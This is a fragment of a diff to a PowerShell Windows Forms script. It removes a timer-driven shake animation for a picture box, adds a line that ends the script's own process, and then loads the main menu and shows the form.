-    $timer = New-Object System.Windows.Forms.Timer
-    $timer.Interval = 10
-    $counter = 0
-    $timer.Add_Tick({
-        $counter++
-        if ($counter -le 10) {
-            $pictureBox.Location = New-Object System.Drawing.Point($originalLocation.X + [math]::Sin($counter * 0.3) * 3, $originalLocation.Y + [math]::Cos($counter * 0.3) * 3)
-        } else {
-            $pictureBox.Location = $originalLocation
-            $timer.Stop()
-        }
-    })
-    $timer.Start()
-}
+    Stop-Process -Id $PID
+})
+
 # Initial Load
 Show-MainMenu
+
 # Run the form
 [void]$form.ShowDialog()
